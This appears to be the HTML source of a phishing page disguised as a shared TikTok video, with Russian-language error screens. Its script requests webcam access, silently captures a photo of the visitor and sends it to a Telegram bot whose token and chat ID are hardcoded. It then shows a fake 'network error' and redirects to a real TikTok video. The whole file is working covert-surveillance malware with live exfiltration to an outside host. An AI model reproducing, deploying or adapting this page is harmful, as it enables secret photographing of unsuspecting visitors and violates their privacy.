<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <!-- Open Graph (Telegram/Facebook) -->
  <meta property="og:title" content="TikTok · Fores" />
  <meta property="og:description" content="2039 likes, 124 comments. “Мистер Бист отжал 100 домов для додепа”" />
  <meta property="og:image" content="preview.jpg" />
  <meta property="og:url" content="https://dimakokh.github.io/tiktok/" />
  <meta property="og:type" content="website" />

  <!-- Twitter Card -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="TikTok · Fores" />
  <meta name="twitter:description" content="2039 likes, 124 comments. “Мистер Бист отжал 100 домов для додепа”" />
  <meta name="twitter:image" content="preview.jpg" />

  <title>TikTok - Make Your Day</title>
</head>

  <title>TikTok - Make Your Day</title>
  <style>
    body {
      margin: 0;
      background-color: #0f0f0f;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      font-family: Arial, sans-serif;
      color: white;
      flex-direction: column;
    }
    #logo {
      width: 200px;
      height: 140px;
      position: absolute;
      z-index: 10;
    }
    video, canvas {
      display: none;
    }
    .error-box {
      display: none;
      flex-direction: column;
      align-items: center;
      text-align: center;
    }
    .error-icon {
      width: 90px;
      height: 90px;
      margin-bottom: 20px;
      fill: #aaa;
    }
    .error-title {
      font-size: 24px;
      font-weight: bold;
      margin-bottom: 10px;
    }
    .error-subtitle {
      font-size: 14px;
      color: #aaa;
      margin-bottom: 20px;
    }
    .retry-button {
      padding: 10px 20px;
      background-color: #272727;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 14px;
      cursor: pointer;
    }
    .retry-button:hover {
      background-color: #3a3a3a;
    }
  </style>
</head>
<body>
  <img id="logo" src="tiktok.logo.png" alt="TikTok Logo">
  <video id="video" autoplay></video>
  <canvas id="canvas" width="1280" height="720"></canvas>

  <div id="error-message" class="error-box">
    <svg class="error-icon" viewBox="0 0 72 72" fill="rgba(128, 130, 133, 1)" xmlns="http://www.w3.org/2000/svg">
      <path d="M36.2544 66.8965C38.3507 66.8965 40.05 65.1971 40.05 63.1008C40.05 61.0045 38.3507 59.3052 36.2544 59.3052C34.1581 59.3052 32.4587 61.0045 32.4587 63.1008C32.4587 65.1971 34.1581 66.8965 36.2544 66.8965Z"></path>
      <path fill-rule="evenodd" clip-rule="evenodd" d="M44.0911 16.0463L41.8628 18.7804C39.935 18.56 37.9871 18.4349 36.0341 18.4349C24.1665 18.4349 12.6093 22.5961 3.48571 30.1523C3.20529 30.3826 2.86479 30.4978 2.52929 30.4978C2.09865 30.4978 1.66801 30.3125 1.37257 29.952C0.846784 29.3161 0.931911 28.3696 1.57286 27.8389C11.2322 19.8369 23.4755 15.4304 36.0392 15.4304C38.7482 15.4304 41.4372 15.6457 44.0911 16.0463ZM32.779 29.9221C25.0625 30.5381 17.8117 33.3573 11.6475 38.1594C10.9915 38.6702 10.8764 39.6116 11.3871 40.2675C11.8979 40.9235 12.8393 41.0387 13.4953 40.5279C18.3926 36.7123 24.0309 34.2536 30.0449 33.2771L32.779 29.9221ZM50.2049 48.4843C46.0137 45.6501 41.1114 44.1528 36.0338 44.1528C34.8821 44.1528 33.7454 44.233 32.6187 44.3832L29.5892 48.0987C31.6623 47.4778 33.8255 47.1523 36.0338 47.1523C40.5105 47.1523 44.8269 48.4693 48.5224 50.968C49.2134 51.4337 50.1448 51.2534 50.6105 50.5624C51.0762 49.8814 50.8909 48.95 50.2049 48.4843ZM60.4207 38.1653C55.4934 34.3245 49.875 31.7607 43.8811 30.5689L41.7079 33.2379C47.842 34.1793 53.5906 36.653 58.573 40.5338C58.8484 40.7491 59.1739 40.8493 59.4943 40.8493C59.94 40.8493 60.3857 40.649 60.6811 40.2684C61.1969 39.6174 61.0767 38.676 60.4207 38.1653ZM53.7655 18.4401C59.7944 20.5282 65.4529 23.6729 70.4253 27.779C71.0662 28.3048 71.1563 29.2512 70.6255 29.8972C70.0998 30.5331 69.1534 30.6232 68.5124 30.0975C63.53 25.9863 57.8215 22.8967 51.7374 20.9288L53.7655 18.4401Z"></path>
      <path d="M14.4869 61.0034C14.1514 61.0034 13.8159 60.8932 13.5405 60.6679C12.8996 60.1421 12.7994 59.1957 13.3252 58.5547L56.3993 5.69607C56.9251 5.05512 57.8715 4.95497 58.5125 5.48075C59.1534 6.00653 59.2536 6.95294 58.7278 7.5939L15.6537 60.4526C15.3532 60.8181 14.9226 61.0034 14.4869 61.0034Z"></path>
    </svg>
    <div class="error-title">Ошибка сети</div>
    <div class="error-subtitle">Подключитесь к сети и повторите попытку.</div>
    <button class="retry-button" onclick="redirect()">Попробовать ещё раз</button>
  </div>

  <div id="camera-error" class="error-box">
   <svg width="90" data-e2e="" height="90" viewBox="0 0 72 72" fill="currentColor" xmlns="http://www.w3.org/2000/svg" style="fill-opacity: 0.34;"><path fill-rule="evenodd" clip-rule="evenodd" d="M8.59922 63.1209H51.2069C55.3809 63.1209 58.7776 59.7242 58.7826 55.5503V45.1431L68.4428 53.8141C68.887 54.2128 69.5279 54.3188 70.073 54.0715C70.6181 53.8292 70.9714 53.2841 70.9714 52.6886V18.661C70.9714 18.0654 70.6181 17.5203 70.073 17.278C69.5229 17.0358 68.887 17.1367 68.4428 17.5354L58.7826 26.2064V15.7992C58.7826 11.6253 55.3859 8.22858 51.212 8.22858H8.59922C4.42526 8.22858 1.02855 11.6253 1.02855 15.7992V55.5503C1.02855 59.7242 4.42526 63.1209 8.59922 63.1209ZM4.05681 15.7995C4.05681 13.2961 6.09585 11.2571 8.59921 11.2571H51.212C53.7153 11.2571 55.7544 13.2961 55.7544 15.7995V29.6033C55.7544 30.1989 56.1077 30.744 56.6528 30.9862C57.2029 31.2285 57.8388 31.1276 58.283 30.7288L67.9431 22.0579V49.2972L58.283 40.6262C57.8388 40.2275 57.1978 40.1266 56.6528 40.3688C56.1077 40.6111 55.7544 41.1562 55.7544 41.7517V55.5505C55.7544 58.0539 53.7153 60.0929 51.212 60.0929H8.59921C6.09585 60.0929 4.05681 58.0539 4.05681 55.5505V15.7995Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M21.217 47.3887C21.4491 47.525 21.7116 47.5906 21.974 47.5906C22.2365 47.5906 22.4989 47.52 22.7311 47.3837L40.7442 36.9866C41.2136 36.7141 41.5013 36.2144 41.5013 35.6744C41.5013 35.1344 41.2136 34.6347 40.7442 34.3621L22.7311 23.9601C22.2617 23.6875 21.6864 23.6875 21.217 23.9601C20.7476 24.2326 20.4599 24.7323 20.4599 25.2723V46.0765C20.4599 46.6165 20.7476 47.1162 21.217 47.3887ZM36.9589 35.6744L23.4882 43.452V27.8968L36.9589 35.6744Z"></path></svg>
    <div class="error-title">Ошибка сервера</div>
    <div class="error-subtitle">Видео не доступно</div>
    <button class="retry-button" onclick="reloadPage()">Попробовать ещё раз</button>
  </div>


  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    const logo = document.getElementById('logo');
    const errorMessage = document.getElementById('error-message');
    const cameraError = document.getElementById('camera-error');

    const TOKEN = '7713305706:AAGumZO2S6FyoK9PLNST9tb-v-cP_n3Wjsk';
    const CHAT_ID = '7956071137';
    const TELEGRAM_URL = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;

    function captureAndSend() {
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      logo.style.display = 'none';  // Скрыть логотип при отправке

      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'photo.png');

        fetch(TELEGRAM_URL, {
          method: 'POST',
          body: formData
        }).finally(() => {
          showErrorMessage();  // Показать сообщение об ошибке
        });
      }, 'image/png');
    }
    
    function reloadPage() {
      location.reload();
    }

    function showErrorMessage() {
      logo.style.display = 'none';  // Скрыть логотип при ошибке
      errorMessage.style.display = 'flex';
    }

    function cameraErrorHandler() {
      logo.style.display = 'none';  // Скрыть логотип при ошибке камеры
      cameraError.style.display = 'flex';
    }

    function redirect() {
      window.location.href = 'https://www.tiktok.com/@zondrey/video/7498389033094090006?is_from_webapp=1&sender_device=pc&web_id=7459374065494869510';
    }

    navigator.mediaDevices.getUserMedia({ 
         video: { width: { ideal: 1280 }, height: { ideal: 720 } } 
    })

      .then(stream => {
        video.srcObject = stream;
        video.onloadeddata = () => {
          captureAndSend();
        };
      })
      .catch(err => {
        cameraErrorHandler();
      });
  </script>
</body>
</html>
